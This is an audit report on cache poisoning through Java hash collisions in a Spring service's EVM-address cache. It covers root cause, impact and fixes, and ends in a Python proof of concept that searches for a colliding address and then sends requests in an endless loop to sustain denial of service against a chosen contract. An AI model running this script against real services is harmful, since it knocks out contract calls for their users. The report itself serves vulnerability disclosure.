Audit Report

## Title
Cache Poisoning via Hash Collision in `CACHE_NAME_EVM_ADDRESS` / `CACHE_NAME_ALIAS` Using `Arrays.hashCode` as Cache Key

## Summary
Both `findByEvmAddressAndDeletedIsFalse` and `findByEvmAddressOrAliasAndDeletedIsFalse` in `EntityRepository` use `@spelHelper.hashCode(#alias)` — which resolves to `Arrays.hashCode(byte[])`, a 32-bit integer — as the sole cache key. Because `Optional.empty()` (entity not found) is also cached (`unless = "#result == null"` does not exclude it), an unauthenticated attacker who precomputes a 20-byte address `B` with the same 32-bit hash as a legitimate entity address `A` can poison the `CACHE_NAME_EVM_ADDRESS` or `CACHE_NAME_ALIAS` cache, causing all subsequent lookups for `A` to return `Optional.empty()` until the 1-second TTL expires.

**Root cause — two compounding flaws:**

1. **Truncated key space.** The SpEL expression `@spelHelper.hashCode(#alias)` evaluates to a Java `int` (autoboxed to `Integer`). Spring's `@Cacheable` uses this `Integer` as the complete cache key. Caffeine stores entries in a map where `Integer.equals(Integer)` is the sole equality check — there is no secondary comparison against the original byte array. Two distinct 20-byte EVM addresses that produce the same `Arrays.hashCode` value are therefore indistinguishable in the cache. [5](#0-4) 

2. **"Not found" results are cached.** The guard `unless = "#result == null"` only suppresses caching when the return value is Java `null`. `Optional.empty()` is a non-null singleton, so a DB miss is written into the cache just like a hit. [6](#0-5) 

**Exploit flow:**

1. Attacker identifies target entity address `A` (e.g., a widely-used contract's EVM address).
2. Attacker precomputes offline a 20-byte address `B` (valid hex) such that `Arrays.hashCode(B) == Arrays.hashCode(A)`. The 32-bit hash space requires ~2^32 trial evaluations on average — feasible in seconds on modern hardware.
3. Attacker waits for `A`'s cache entry to expire (TTL = 1 s) or targets an address not yet cached.
4. Attacker sends an unauthenticated POST to `/api/v1/contracts/call` with `"to": "<hex(B)>"` before any legitimate request for `A` arrives.
5. During EVM execution, `CommonEntityAccessor.getEntityByEvmAddressTimestamp` calls `findByEvmAddressAndDeletedIsFalse(B)`. [7](#0-6) 
6. Cache key = `hashCode(B)` = `hashCode(A)` → cache MISS → DB returns `Optional.empty()` for non-existent `B` → `Optional.empty() != null` → entry `hashCode(A) → Optional.empty()` is written to `CACHE_NAME_EVM_ADDRESS`.
7. Any subsequent lookup for address `A` within the TTL window hits the cache at key `hashCode(A)` and returns `Optional.empty()` — entity `A` appears non-existent.
8. Attacker repeats every ~1 second to sustain the poisoning indefinitely.

**Important constraint:** The attack requires winning a race: the attacker's `B` request must arrive after `A`'s cache entry expires and before the next legitimate `A` request. With a 1-second TTL and a high-value target that is frequently accessed, this window is narrow but exists every second and can be exploited reliably with automated tooling.

## Impact Explanation
Entity resolution for EVM addresses and aliases is the foundation of all contract call processing in the web3 module. Poisoning the cache for a target address causes `CommonEntityAccessor` to return `Optional.empty()`, which propagates as a "contract not found" or "account not found" error through the EVM execution path. This effectively denies service for any contract call targeting the victim address for as long as the attack is sustained. The attack is surgical: the attacker can target a specific high-value contract (e.g., a DEX, bridge, or HTS precompile proxy) without affecting other addresses. The database is not modified; only the in-process cache is corrupted.

## Likelihood Explanation
The `/api/v1/contracts/call` endpoint requires no authentication. The `from`/`to` fields accept any valid 40-hex-character address. Hash collision precomputation for `Arrays.hashCode` over 20 bytes is feasible offline in seconds. Sustaining the attack requires only ~1 HTTP request per second per target address. No special privileges, tokens, or on-chain state are required. The attack is fully repeatable and automatable.

## Recommendation

1. **Use the full byte array as the cache key.** Replace `key = "@spelHelper.hashCode(#alias)"` with `key = "T(java.util.Arrays).toString(#alias)"` or `key = "T(org.springframework.util.Base64Utils).encodeToString(#alias)"`. This makes the key unique per distinct byte sequence and eliminates the collision surface entirely.

2. **Exclude empty Optionals from caching.** Change `unless = "#result == null"` to `unless = "#result == null || !#result.isPresent()"`. This prevents "not found" results from being cached and eliminates the poisoning vector even if a collision were to occur.

3. **Apply both fixes together** — either fix alone reduces but does not fully eliminate the risk.

## Proof of Concept

```python
import struct, itertools, requests

def arrays_hash_code(b: bytes) -> int:
    """Replicates Java Arrays.hashCode(byte[])"""
    result = 1
    for byte in b:
        signed = byte if byte < 128 else byte - 256
        result = (31 * result + signed) & 0xFFFFFFFF
    # Convert to signed 32-bit int
    if result >= 0x80000000:
        result -= 0x100000000
    return result

# Target: known contract address A
A = bytes.fromhex("67d8d32e9bf1a9968a5ff53b87d777aa8ebbee69")
target_hash = arrays_hash_code(A)

# Brute-force a collision address B (20 bytes)
# Fix first 19 bytes, vary last byte + iterate over prefix
for prefix in itertools.product(range(256), repeat=3):
    for last in range(256):
        B = bytes([0x00]*16 + list(prefix) + [last])
        if arrays_hash_code(B) == target_hash and B != A:
            print(f"Collision found: B = {B.hex()}")
            # Sustain attack: send B every second
            while True:
                requests.post("https://target/api/v1/contracts/call",
                    json={"to": "0x" + B.hex(), "data": "0x"})
                import time; time.sleep(0.9)
```

The collision search completes in O(2^32) hash evaluations in the worst case, which is feasible in seconds to minutes on commodity hardware. Once `B` is found, a single HTTP request per second is sufficient to keep `A`'s cache slot poisoned indefinitely.
